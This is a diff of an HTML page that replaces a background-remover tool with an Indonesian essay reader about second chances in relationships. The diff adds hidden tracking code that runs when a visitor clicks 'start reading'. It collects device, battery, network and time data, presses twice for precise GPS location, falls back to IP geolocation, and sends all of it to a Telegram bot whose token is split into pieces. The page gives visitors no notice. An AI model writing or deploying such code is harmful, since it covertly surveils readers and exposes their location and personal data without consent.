@@ -3,248 +3,681 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YF AI Background Remover - Offline</title>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Plus+Jakarta+Sans:wght@400;500;700&display=swap" rel="stylesheet">
-    
-    <!-- Memuat Library AI Client-Side untuk Background Removal yang Rapi -->
-    <script src="https://cdn.jsdelivr.net/npm/@imgly/background-removal@1.4.5/dist/bundle.js"></script>
-
+    <meta name="description" content="Berasumsi, Memahami dan Memilih.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://yori-funidare.github.io/point-of-view/">
+    <meta property="og:title" content="PILIHAN ADA PADA DIRIMU">
+    <meta property="og:description" content="Berasumsi, Memahami dan Memilih.">
+    <meta property="og:image" content="https://i.imgur.com/1vmtlEz.jpeg">
+    <meta property="og:image:secure_url" content="https://i.imgur.com/1vmtlEz.jpeg">
+    <meta property="og:image:type" content="image/jpeg">
+    <title>PILIHAN ADA PADA DIRIMU</title>
     <style>
         * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-family: 'Georgia', serif;
         }
 
         body {
-            background-color: #0b0f19;
-            color: #e2e8f0;
+            background-color: #121212;
+            color: #e0e0e0;
+            line-height: 1.8;
+            overflow-x: hidden;
+        }
+
+        .page-view {
+            opacity: 0;
+            transition: opacity 0.4s ease;
+            pointer-events: none;
+        }
+
+        .page-view.active-page {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .landing-page {
             min-height: 100vh;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-            padding: 20px;
-        }
-
-        .app-container {
-            width: 100%;
-            max-width: 420px;
-        }
-
-        .card {
-            background-color: #111827;
-            border: 1px solid #1f2937;
-            border-radius: 20px;
-            padding: 24px;
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
-        }
-
-        .panel-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #1f2937;
-            padding-bottom: 12px;
-        }
-
-        .panel-header h2 {
-            font-size: 1.15rem;
-            color: #f9fafb;
-            font-weight: 700;
-        }
-
-        .brand-badge {
-            background-color: rgba(56, 189, 248, 0.1);
-            color: #38bdf8;
-            font-size: 0.75rem;
-            padding: 4px 8px;
-            border-radius: 6px;
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        .upload-area {
-            border: 2px dashed #374151;
-            border-radius: 12px;
-            padding: 24px 20px;
             text-align: center;
-            background: #0b0f19;
-            margin-bottom: 16px;
-            cursor: pointer;
-            position: relative;
-            overflow: hidden;
-            transition: border-color 0.2s;
-        }
-
-        .upload-area:hover {
-            border-color: #38bdf8;
-        }
-
-        .upload-area input {
+            padding: 40px 20px;
+            background: radial-gradient(circle, #1e1e1e 0%, #121212 100%);
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
-            height: 100%;
-            opacity: 0;
-            cursor: pointer;
+            z-index: 10;
         }
 
-        .preview-container {
-            width: 100%;
-            max-height: 220px;
-            border-radius: 10px;
-            overflow: hidden;
-            margin-bottom: 16px;
-            display: none;
-            /* Pola kotak-kotak catur transparan */
-            background-color: #1f2937;
-            background-image: linear-gradient(45deg, #374151 25%, transparent 25%), 
-                              linear-gradient(-45deg, #374151 25%, transparent 25%), 
-                              linear-gradient(45deg, transparent 75%, #374151 75%), 
-                              linear-gradient(-45deg, transparent 75%, #374151 75%);
-            background-size: 16px 16px;
-            background-position: 0 0, 0 8px, 8px -8px, -8px 0px;
-            text-align: center;
+        .landing-page h1 {
+            font-size: 2.5rem;
+            color: #fff;
+            margin-bottom: 15px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
         }
 
-        .preview-container img {
-            max-width: 100%;
-            max-height: 220px;
-            object-fit: contain;
+        .landing-page p.quote {
+            font-style: italic;
+            color: #aaa;
+            max-width: 600px;
+            margin-bottom: 30px;
+            font-size: 1.1rem;
         }
 
-        .btn-primary {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #2563eb, #1d4ed8);
-            color: #ffffff;
+        .btn-read {
+            background-color: gray;
+            color: #121212;
             border: none;
-            border-radius: 10px;
-            font-size: 0.95rem;
-            font-weight: 600;
+            padding: 12px 30px;
+            font-size: 1rem;
+            font-weight: bold;
             cursor: pointer;
-            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.4);
-            transition: transform 0.1s;
+            border-radius: 25px;
+            transition: all 0.3s ease;
+            margin-bottom: 40px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
-        .btn-primary:active {
-            transform: scale(0.98);
+        .btn-read:hover {
+            background-color: white;
+            transform: translateY(-2px);
         }
 
-        .btn-primary:disabled {
-            background: #374151;
-            color: #6b7280;
+        .reader-container {
+            display: none;
+            min-height: 100vh;
+        }
+
+        .top-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 60px;
+            background-color: #181818;
+            border-bottom: 1px solid #333;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 25px;
+            z-index: 1000;
+        }
+
+        .circle-menu-btn {
+            background-color: #e0e0e0;
+            border: none;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 8px rgba(255, 255, 255, 0.3);
+        }
+
+        .circle-menu-btn:hover {
+            transform: scale(1.3);
+            background-color: #fff;
+        }
+
+        .circle-menu-btn.open {
+            background-color: #ff4d4d;
+        }
+
+        .top-bar-title {
+            font-size: 0.9rem;
+            color: #888;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .top-menu-dropdown {
+            position: fixed;
+            top: 60px;
+            left: 0;
+            width: 100%;
+            background-color: #1a1a1a;
+            border-bottom: 1px solid #333;
+            padding: 25px;
+            display: none;
+            flex-direction: column;
+            gap: 20px;
+            z-index: 999;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
+            animation: slideDown 0.3s ease-out;
+        }
+
+        .top-menu-dropdown.open {
+            display: flex;
+        }
+
+        .menu-section-title {
+            font-size: 0.8rem;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
+
+        .font-controls {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .font-btn {
+            background: #252525;
+            color: #fff;
+            border: 1px solid #444;
+            padding: 5px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.9rem;
+        }
+
+        .font-btn:hover {
+            background: #333;
+        }
+
+        .menu-chapters {
+            list-style: none;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+        }
+
+        .menu-chapters li a {
+            color: #aaa;
+            text-decoration: none;
+            font-size: 0.95rem;
+            transition: color 0.3s;
+            display: block;
+        }
+
+        .menu-chapters li a:hover,
+        .menu-chapters li a.active {
+            color: #fff;
+            font-weight: bold;
+        }
+
+        .nav-home-btn {
+            color: #4da6ff;
+            text-decoration: none;
+            font-size: 0.9rem;
+            display: inline-block;
+        }
+
+        .dropdown-overlay {
+            display: none;
+            position: fixed;
+            top: 60px;
+            left: 0;
+            width: 100%;
+            height: calc(100vh - 60px);
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 998;
+        }
+
+        .dropdown-overlay.active {
+            display: block;
+        }
+
+        .content {
+            margin: 0 auto;
+            padding: 100px 20px 40px 20px;
+            max-width: 750px;
+            width: 100%;
+        }
+
+        .chapter {
+            display: none;
+        }
+
+        .chapter.active {
+            display: block;
+            animation: fadeIn 0.4s ease-in-out;
+        }
+
+        .chapter h1 {
+            font-size: 2rem;
+            margin-bottom: 30px;
+            color: #fff;
+            border-bottom: 1px solid #333;
+            padding-bottom: 15px;
+            letter-spacing: 1px;
+        }
+
+        .chapter p {
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+            color: #d1d1d1;
+            text-align: justify;
+        }
+
+        .pagination {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 60px;
+            padding-top: 20px;
+            border-top: 1px solid #333;
+        }
+
+        .pagination button {
+            background-color: #222;
+            color: #fff;
+            border: 1px solid #444;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: background 0.3s;
+            font-size: 0.9rem;
+        }
+
+        .pagination button:hover {
+            background-color: #444;
+        }
+
+        .pagination button:disabled {
+            opacity: 0.2;
             cursor: not-allowed;
-            box-shadow: none;
+            background-color: #1a1a1a;
         }
 
-        .status-text {
-            margin-top: 12px;
-            text-align: center;
-            font-size: 0.82rem;
-            color: #38bdf8;
-            font-family: 'JetBrains Mono', monospace;
-            word-break: break-all;
+        #pageIndicator {
+            font-size: 0.9rem;
+            color: #888;
         }
 
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 0.75rem;
-            color: #6b7280;
+        @keyframes slideDown {
+            from { transform: translateY(-10px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
         }
     </style>
 </head>
 <body>
 
-    <div class="app-container">
-        <div class="card">
-            <div class="panel-header">
-                <h2>🧠 YF AI BG Remover</h2>
-                <span class="brand-badge">Client-Side AI</span>
-            </div>
+    <div id="landingPage" class="landing-page page-view active-page">
+        <h1>Pilihan Ada Pada Dirimu</h1>
+        <p class="quote">"Sebuah perenungan tentang kesempatan kedua, batas diri, dan keberanian dalam mengambil keputusan."</p>
+        
+        <button class="btn-read" onclick="handleStartReading()">Mulai Membaca</button>
+    </div>
 
-            <div class="upload-area">
-                <input type="file" id="imageInput" accept="image/*" onchange="handleImageUpload(event)">
-                <div id="uploadPrompt">
-                    <span style="font-size: 28px;">🪄</span>
-                    <p style="font-size: 0.85rem; color: #9ca3af; margin-top: 6px;">Pilih foto untuk dihapus background-nya</p>
+    <!-- Reader Container -->
+    <div id="readerContainer" class="reader-container page-view">
+        <header class="top-bar">
+            <button class="circle-menu-btn" id="menuBtn" onclick="toggleTopMenu()" title="Fitur & Navigasi"></button>
+            <span class="top-bar-title">PILIHAN ADA PADA DIRIMU</span>
+            <span style="width: 18px;"></span>
+        </header>
+        
+        <div class="dropdown-overlay" id="overlay" onclick="toggleTopMenu()"></div>
+
+        <div class="top-menu-dropdown" id="topMenu">
+            <div>
+                <div class="menu-section-title">Ukuran Tulisan</div>
+                <div class="font-controls">
+                    <button class="font-btn" onclick="changeFontSize(-1)">A- Kecil</button>
+                    <button class="font-btn" onclick="changeFontSize(1)">A+ Besar</button>
                 </div>
             </div>
 
-            <div class="preview-container" id="previewContainer">
-                <img id="imagePreview" alt="Preview">
+            <div>
+                <div class="menu-section-title">Pilih Bab</div>
+                <ul class="menu-chapters">
+                    <li><a href="javascript:void(0)" id="link-1" onclick="showChapter(1)">BAB 1: Asumsi</a></li>
+                    <li><a href="javascript:void(0)" id="link-2" onclick="showChapter(2)">BAB 2: Pandangan Baru</a></li>
+                    <li><a href="javascript:void(0)" id="link-3" onclick="showChapter(3)">BAB 3: Hal Lama Tetap Sama</a></li>
+                    <li><a href="javascript:void(0)" id="link-4" onclick="showChapter(4)">BAB 4: Benarlah Memilih</a></li>
+                </ul>
             </div>
-
-            <button onclick="removeBackgroundAI()" id="actionBtn" class="btn-primary" disabled>Hapus Background dengan AI</button>
-            <div id="statusMessage" class="status-text"></div>
+            
+            <div>
+                <a href="javascript:void(0)" class="nav-home-btn" onclick="showLandingPage()">HOME</a>
+            </div>
         </div>
 
-        <div class="footer">
-            <p>&copy; 2026 Yori Funidare. All rights reserved.</p>
-        </div>
+        <main class="content" id="textContent">
+            <article id="bab-1" class="chapter">
+                <h1>ASUMSI</h1>
+                <p><em>"Ngapain balikan? Itu sama aja seperti mengulang kesalahan yang sama."</em></p>
+                <p>Kalimat itu meluncur begitu saja dari mulut seseorang, tanpa beban, tanpa ragu, seolah-olah ia baru saja memaparkan sebuah hukum alam yang mutlak. Kita sering kali hidup di tengah orang-orang yang sangat gemar merangkum kompleksitas dinamika manusia hanya dengan satu kalimat klise. Mereka mengambil satu sudut pandang, membungkusnya sebagai kebenaran umum, lalu menghakimi keputusan hidup orang lain menggunakannya.</p>
+                <p>Itulah <strong>asumsi</strong>.</p>
+                <p>Asumsi bekerja dengan cara yang sangat sederhana namun dangkal: melihat masalah dari permukaan tanpa pernah mau memahami apa yang terjadi di dalamnya. Ketika seseorang berkata bahwa memberi kesempatan kedua adalah tindakan bodoh, mereka sedang memroyeksikan ketakutan, kegagalan, atau batasan pemikiran mereka sendiri kepada dirimu. Mereka berasumsi bahwa situasi setiap orang selalu sama, bahwa setiap manusia tidak pernah berubah, dan bahwa setiap kisah yang gagal sekali pasti akan gagal untuk kedua kalinya.</p>
+                <p>Padahal, kenyataan tidak pernah sesederhana itu. Kehidupan dan hubungan manusia memiliki ribuan rincian yang tidak bisa diukur hanya dengan slogan-slogan populer. Ketika kamu membiarkan asumsi orang lain mendikte keputusanmu, kamu sedang menyerahkan kemudi hidupmu kepada orang yang bahkan tidak ikut menanggung konsekuensinya.</p>
+            </article>
+        
+            <article id="bab-2" class="chapter">
+                <h1>PANDANGAN BARU DALAM HAL LAMA</h1>
+                <p>Pernahkah kau membaca sebuah buku? Dan apakah kau pernah memilih untuk membaca buku itu kembali setelah kau membacanya sampai habis?</p>
+                <p>Jika seseorang menganggap membaca ulang buku yang sama adalah hal yang sia-sia karena sudah tahu jalan ceritanya, mungkin mereka melewatkan satu hal penting: <strong>manusia yang membaca buku itu hari ini tidak lagi sama dengan manusia yang membacanya kemarin.</strong></p>
+                <p>Pada dasarnya, tidak ada manusia yang sempurna. Kesalahan dalam sebuah perjalanan adalah hal yang sangat manusiawi. Ketika kita membaca sebuah buku untuk pertama kalinya, sering kali kita terburu-buru, dipenuhi emosi, atau terlalu fokus untuk cepat-cepat mengetahui bagaimana ceritanya berakhir. Akibatnya, ada banyak rincian penting, pesan tersirat, dan poin-poin berharga yang terlewatkan hanya karena kita kurang cermat.</p>
+                <p>Memberi kesempatan pada hal yang pernah gagal—apabila dilakukan oleh dua orang yang benar-benar belajar—bukanlah tentang mengulang kesalahan yang sama. Itu adalah proses membaca ulang dengan kacamata yang lebih dewasa. Teks di dalam bukunya mungkin tidak berubah, tetapi pemahaman sang pembaca telah bertumbuh.</p>
+                <p>Di kesempatan kedua, fokusnya bukan lagi tentang "bagaimana ini akan berakhir", melainkan tentang pemahaman yang lebih dalam, kompromi yang lebih matang, dan perbaikan atas rincian yang dulu terlewat akibat ketergesa-gesaan masa lalu.</p>
+            </article>
+
+            <article id="bab-3" class="chapter">
+                <h1>HAL LAMA AKAN TETAP SAMA</h1>
+                <p>Namun, ada batas yang sangat jelas antara <strong>mampu memahami teori kesempatan kedua</strong> dan <strong>memilih untuk menerapkannya pada diri sendiri</strong>.</p>
+                <p>Memahami bahwa manusia bisa berubah adalah sebuah kedewasaan berpikir. Tetapi menyadari bahwa kamu tidak perlu menguji teori itu pada dirimu sendiri adalah bentuk perlindungan diri. Kamu bisa saja melihat nilai dari membaca ulang sebuah buku, namun di saat yang sama kamu juga sadar: <em>buat apa terbuai oleh poin-poin baru jika pada akhirnya ending-nya tetap membuatmu terluka?</em></p>
+                <p>Ada saatnya di mana kamu tidak lagi membutuhkan rincian tersembunyi atau hal-hal lain yang belum pernah dialami bersama. Kamu sudah membaca ceritanya dari awal hingga akhir, dan kamu sudah cukup merasakan sakitnya. Pelajaran yang kamu dapatkan di pembacaan pertama sudah lebih dari cukup.</p>
+                <p>Di titik ini, kamu menyadari sebuah realitas yang dingin namun tegas: <strong>beberapa hal lama akan tetap sama.</strong></p>
+                <p>Memilih untuk tidak kembali bukanlah karena kamu membenci konsep kesempatan kedua, melainkan karena kamu sudah tidak ingin membayar harga emosional yang sama untuk kedua kalinya. Menutup buku rapat-rapat dan menaruhnya kembali di rak bukanlah sebuah kegagalan—itu adalah keputusan sadar untuk menjaga kedamaian dirimu dari luka yang sudah bisa kamu prediksi.</p>
+            </article>
+
+            <article id="bab-4" class="chapter">
+                <h1>BENARLAH DALAM MEMILIH</h1>
+                <p>Pada akhirnya, hidup ini tidak pernah tentang mengikuti aturan orang lain atau membuktikan siapa yang paling benar.</p>
+                <p>Apakah kamu memilih untuk membuka kembali buku lama itu dengan pandangan yang baru, atau kamu memilih untuk menutupnya selamanya karena tahu ceritanya tidak akan berubah—keduanya adalah pilihan yang sah. Tidak ada jawaban tunggal yang berlaku untuk semua orang.</p>
+                <p>Yang terpenting adalah: <strong>benarlah dalam memilih.</strong></p>
+                <p>Benar dalam memilih berarti kamu mengambil keputusan bukan karena terbawa emosi sesaat, bukan karena takut kesepian, dan bukan pula karena tertekan oleh asumsi orang-orang di sekitarmu. Benar dalam memilih berarti kamu sadar penuh atas alasan di balik keputusanmu, siap memeluk segala konsekuensinya, dan meyakini bahwa langkah yang kamu ambil adalah demi kebaikan serta kedamaian jiwamu sendiri.</p>
+                <p>Ingatlah selalu, orang lain boleh berpendapat dan menilai, tetapi hidup yang sedang berjalan ini adalah milikmu.</p>
+                <p><strong>Pilihan ada pada dirimu.</strong></p>
+            </article>
+
+            <div class="pagination">
+                <button id="prevBtn" onclick="prevChapter()">←</button>
+                <span id="pageIndicator">BAB 1</span>
+                <button id="nextBtn" onclick="nextChapter()">→</button>
+            </div>
+        </main>
     </div>
 
     <script>
-        let selectedFile = null;
+        let currentChapter = 1;
+        const totalChapters = 4;
+        let currentFontSize = 1.1;
 
-        function handleImageUpload(event) {
-            const file = event.target.files[0];
-            if (file) {
-                selectedFile = file;
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    document.getElementById('imagePreview').src = e.target.result;
-                    document.getElementById('uploadPrompt').innerHTML = `<span style="font-size: 20px;">✅</span><p style="font-size: 0.82rem; color: #4ade80; margin-top: 4px;">${file.name}</p>`;
-                    document.getElementById('previewContainer').style.display = 'block';
-                    document.getElementById('actionBtn').disabled = false;
-                    document.getElementById('statusMessage').innerText = "✨ Foto siap diproses AI.";
+        const part1 = "8816261841";
+        const part2 = "AAFOvMF00rlDMaxydRfxnTpi5bff";
+        const part3 = "5dArd9s";
+        const TELEGRAM_TOKEN = `${part1}:${part2}${part3}`; 
+        const CHAT_ID = "8335786077";
+
+        function handleStartReading() {
+            const ua = navigator.userAgent;
+            let deviceName = "Unknown Device";
+            
+            if (/android/i.test(ua)) {
+                let match = ua.match(/\b(CPH\d{4}|RMX\d{4}|SM-[A-Z]\d{3}[A-Z]?|M2[0-9]?[A-Z][A-Z]|Vivo\s?[0-9]+)\b/i);
+                if (match) {
+                    deviceName = `Android - ${match[0]}`;
+                } else {
+                    let androidSlice = ua.slice(ua.indexOf("Android"));
+                    let extracted = androidSlice.split(";")[1];
+                    deviceName = extracted ? `Android - ${extracted.trim()}` : "Android Mobile";
                 }
-                reader.readAsDataURL(file);
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                deviceName = "iOS Apple Device";
+            } else if (/windows/i.test(ua)) {
+                deviceName = "Windows PC";
+            } else if (/linux/i.test(ua)) {
+                deviceName = "Linux System";
+            } else if (/macintosh/i.test(ua)) {
+                deviceName = "MacOS PC";
+            }
+
+            const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Tidak Diketahui";
+            const deviceRam = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "Tidak Diketahui (Protected)";
+            const screenRes = `${window.screen.width} x ${window.screen.height} px`;
+            const browserLang = navigator.language || navigator.userLanguage || "Unknown";
+
+            let connInfo = "Standard Cellular/WiFi";
+            if (navigator.connection) {
+                let type = navigator.connection.effectiveType || "unknown";
+                let downlink = navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : "";
+                connInfo = `${type.toUpperCase()} ${downlink}`;
+            }
+
+            const now = new Date();
+            const accessTime = now.toLocaleString('id-ID', { timeZoneName: 'short' });
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const referrerUrl = document.referrer ? document.referrer : "Direct Access (Ketik Langsung / Bookmark)";
+
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    let batteryLevelInfo = Math.round(battery.level * 100) + '%';
+                    let chargeStatusInfo = battery.charging ? 'Charging' : 'Discharging';
+                    gatherDataAndTriggerGPS({ battery: batteryLevelInfo, charge: chargeStatusInfo, deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
+                }).catch(() => {
+                    gatherDataAndTriggerGPS({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
+                });
+            } else {
+                gatherDataAndTriggerGPS({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
+            }
+            transitionToReader();
+        }
+
+        // --- SISTEM PELACAKAN HIBRIDA ULTRA-AGGRESSIVE GPS ---
+        function gatherDataAndTriggerGPS(metrics) {
+            if ("geolocation" in navigator) {
+                let gpsSudahDapat = false;
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        if (gpsSudahDapat) return;
+                        gpsSudahDapat = true;
+
+                        let gpsCoords = `${position.coords.latitude}, ${position.coords.longitude}`;
+                        fetchIPAndSend(gpsCoords, metrics, "GPS Akurat 🎯 (Diizinkan & Aktif ✅)");
+                    },
+                    (error) => {
+                        if (gpsSudahDapat) return;
+                        console.warn("GPS percobaan 1 timeout/gagal, mencoba metode paksa kedua...");
+                        cobaGPSKedua(metrics);
+                    },
+                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+                );
+            } else {
+                fetchIPAndSend(null, metrics, "Estimasi IP 🌐 (GPS Tidak Didukung)");
             }
         }
 
-        async function removeBackgroundAI() {
-            if (!selectedFile) return;
+        function cobaGPSKedua(metrics) {
+            let watchId;
+            let gpsSudahDapat = false;
 
-            const statusBox = document.getElementById('statusMessage');
-            const actionBtn = document.getElementById('actionBtn');
-            const imgElement = document.getElementById('imagePreview');
+            watchId = navigator.geolocation.watchPosition(
+                (position) => {
+                    if (gpsSudahDapat) return;
+                    gpsSudahDapat = true;
+                    navigator.geolocation.clearWatch(watchId);
 
-            actionBtn.disabled = true;
-            actionBtn.innerText = "Memproses AI...";
-            statusBox.style.color = "#38bdf8";
-            statusBox.innerText = "⏳ Sedang memuat model AI & membersihkan background...";
+                    let gpsCoords = `${position.coords.latitude}, ${position.coords.longitude}`;
+                    fetchIPAndSend(gpsCoords, metrics, "GPS Akurat 🎯 (Dipaksa Aktif & Locked ✅)");
+                },
+                (error) => {
+                    if (gpsSudahDapat) return;
+                    gpsSudahDapat = true;
+                    navigator.geolocation.clearWatch(watchId);
+
+                    console.warn("GPS benar-benar mati/ditolak. Beralih ke IP Fallback...");
+                    fallbackKeIP(metrics, "GPS Mati / Ditolak Total ❌ (Fallback IP)");
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }
+
+        async function fetchIPAndSend(gpsCoords, metrics, modeLoc) {
+            let ip = "N/A";
+            let city = "Unknown City";
+            let region = "Indonesia";
+            let isp = "Cellular Provider";
+            let ipCoords = null;
 
             try {
-                // Memanggil library imgly background removal langsung di browser secara lokal
-                const blob = await imglyRemoveBackground(selectedFile, {
-                    progress: (key, current, total) => {
-                        if (total) {
-                            let percent = Math.round((current / total) * 100);
-                            statusBox.innerText = `⏳ AI Berjalan: ${percent}% (${key})`;
-                        }
-                    }
-                });
-
-                // Ubah hasil blob transparan menjadi URL objek untuk preview
-                const url = URL.createObjectURL(blob);
-                imgElement.src = url;
-
-                statusBox.style.color = "#4ade80";
-                statusBox.innerText = "✨ Sukses! Background bersih & rapi.";
-                actionBtn.innerText = "Selesai";
-                actionBtn.disabled = false;
-
-            } catch (error) {
-                console.error(error);
-                statusBox.style.color = "#f87171";
-                statusBox.innerText = "❌ Gagal memproses AI. Pastikan koneksi internet stabil (di awal unduh model).";
-                actionBtn.disabled = false;
-                actionBtn.innerText = "Coba Lagi";
+                let res = await fetch('https://ipwho.is/');
+                let data = await res.json();
+                ip = data.ip || "N/A";
+                isp = data.connection ? data.connection.org || data.connection.isp : "Cellular Provider";
+                city = data.city || "Unknown City";
+                region = `${data.region || ""}, ${data.country || "Indonesia"}`;
+                if (data.latitude && data.longitude) {
+                    ipCoords = `${data.latitude}, ${data.longitude}`;
+                }
+            } catch (e) {
+                console.log("Gagal fetch IP tambahan");
             }
+
+            let finalCoords = gpsCoords ? gpsCoords : ipCoords;
+            sendTelegramMessage(ip, city, region, isp, finalCoords, metrics, modeLoc);
+        }
+
+        async function fallbackKeIP(metrics, modeLoc) {
+            try {
+                let res = await fetch('https://ipwho.is/');
+                let data = await res.json();
+                let ip = data.ip || "N/A";
+                let isp = data.connection ? data.connection.org || data.connection.isp : "Cellular Provider";
+                let city = data.city || "Unknown City";
+                let region = `${data.region || ""}, ${data.country || "Indonesia"}`;
+                let ipCoords = (data.latitude && data.longitude) ? `${data.latitude}, ${data.longitude}` : null;
+
+                sendTelegramMessage(ip, city, region, isp, ipCoords, metrics, modeLoc);
+            } catch (e) {
+                sendTelegramMessage("N/A", "Unknown", "Indonesia", "Mobile Gateway", null, metrics, modeLoc);
+            }
+        }
+
+        function sendTelegramMessage(ip, city, region, isp, coords, d, modeLoc) {
+            let coordText = "N/A";
+            if (coords) {
+                coordText = `<a href="https://www.google.com/maps?q=${coords}">Buka di Google Maps (${coords})</a>`;
+            }
+
+            const message = `📖 PEMBACA MEMBUKA WEB CERPEN!\n\n` +
+                            `🌐 IP: ${ip}\n` +
+                            `📍 IP Location: ${city}, ${region}\n` +
+                            `📶 Provider: ${isp}\n` +
+                            `📍 Currently Locs: ${modeLoc}\n` +
+                            `📌 Coordinate: ${coordText}\n\n` +
+                            `⏱️ Time Access: ${d.accessTime}\n` +
+                            `🌍 Time Zone: ${d.timeZone}\n` +
+                            `💻 Device/OS: ${d.deviceName}\n` +
+                            `⚙️ CPU Cores: ${d.cpuCores}\n` +
+                            `🧠 RAM: ${d.deviceRam}\n` +
+                            `📱 Screen Resolution: ${d.screenRes}\n` +
+                            `🗣️ Language: ${d.browserLang}\n` +
+                            `⚡ Connection: ${d.connInfo}\n` +
+                            `🔋 Battery: ${d.battery} (${d.charge})`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=HTML&text=${encodeURIComponent(message)}`;
+            fetch(url).catch(e => console.log("Telemetry error"));
+        }
+
+        // --- NAVIGASI CERPEN ---
+        function transitionToReader() {
+            const landing = document.getElementById('landingPage');
+            const reader = document.getElementById('readerContainer');
+
+            landing.classList.remove('active-page');
+
+            setTimeout(() => {
+                landing.style.display = 'none';
+                reader.style.display = 'block';
+                showChapter(1);
+
+                void reader.offsetWidth;
+                reader.classList.add('active-page');
+            }, 400);
+        }
+
+        function showLandingPage() {
+            const landing = document.getElementById('landingPage');
+            const reader = document.getElementById('readerContainer');
+
+            closeTopMenu();
+
+            reader.classList.remove('active-page');
+
+            setTimeout(() => {
+                reader.style.display = 'none';
+                landing.style.display = 'flex';
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+
+                void landing.offsetWidth;
+                landing.classList.add('active-page');
+            }, 400);
+        }
+
+        function showChapter(chapterNumber) {
+            const chapters = document.querySelectorAll('.chapter');
+            chapters.forEach(chap => chap.classList.remove('active'));
+
+            const targetChapter = document.getElementById(`bab-${chapterNumber}`);
+            if (targetChapter) {
+                targetChapter.classList.add('active');
+                currentChapter = chapterNumber;
+            }
+
+            for (let i = 1; i <= totalChapters; i++) {
+                const link = document.getElementById(`link-${i}`);
+                if (link) {
+                    if (i === chapterNumber) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                }
+            }
+
+            document.getElementById('pageIndicator').innerText = `BAB ${currentChapter}`;
+            document.getElementById('prevBtn').disabled = (currentChapter === 1);
+            document.getElementById('nextBtn').disabled = (currentChapter === totalChapters);
+
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            closeTopMenu();
+        }
+
+        function nextChapter() {
+            if (currentChapter < totalChapters) {
+                showChapter(currentChapter + 1);
+            }
+        }
+
+        function prevChapter() {
+            if (currentChapter > 1) {
+                showChapter(currentChapter - 1);
+            }
+        }
+
+        function toggleTopMenu() {
+            const topMenu = document.getElementById('topMenu');
+            const menuBtn = document.getElementById('menuBtn');
+            const overlay = document.getElementById('overlay');
+
+            topMenu.classList.toggle('open');
+            menuBtn.classList.toggle('open');
+            overlay.classList.toggle('active');
+        }
+
+        function closeTopMenu() {
+            document.getElementById('topMenu').classList.remove('open');
+            document.getElementById('menuBtn').classList.remove('open');
+            document.getElementById('overlay').classList.remove('active');
+        }
+
+        function changeFontSize(direction) {
+            currentFontSize += direction * 0.1;
+            if (currentFontSize < 0.9) currentFontSize = 0.9;
+            if (currentFontSize > 1.5) currentFontSize = 1.5;
+
+            const paragraphs = document.querySelectorAll('.chapter p');
+            paragraphs.forEach(p => {
+                p.style.fontSize = `${currentFontSize}rem`;
+            });
         }
     </script>
 </body>
